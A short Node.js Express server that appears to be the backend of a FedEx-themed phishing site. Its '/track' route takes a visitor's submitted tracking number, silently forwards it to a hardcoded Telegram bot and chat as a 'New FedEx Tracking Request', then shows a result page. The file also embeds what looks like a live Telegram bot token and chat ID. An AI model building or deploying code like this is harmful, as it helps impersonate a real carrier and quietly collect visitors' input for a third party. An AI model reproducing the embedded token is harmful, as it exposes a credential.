const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '8067237902:AAESI73n8Oy_940sK1P4aOE63XFWOHQ2TkI';
const TELEGRAM_CHAT_ID = '7941500322';

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Set up EJS for dynamic HTML rendering
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Handle Tracking Submission
app.post('/track', async (req, res) => {
  const trackingNumber = req.body.trackingNumber;

  // Telegram alert
  const message = `📦 New FedEx Tracking Request:\nTracking Number: ${trackingNumber}`;
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  });

  // Show result page
  res.render('result', { trackingNumber });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
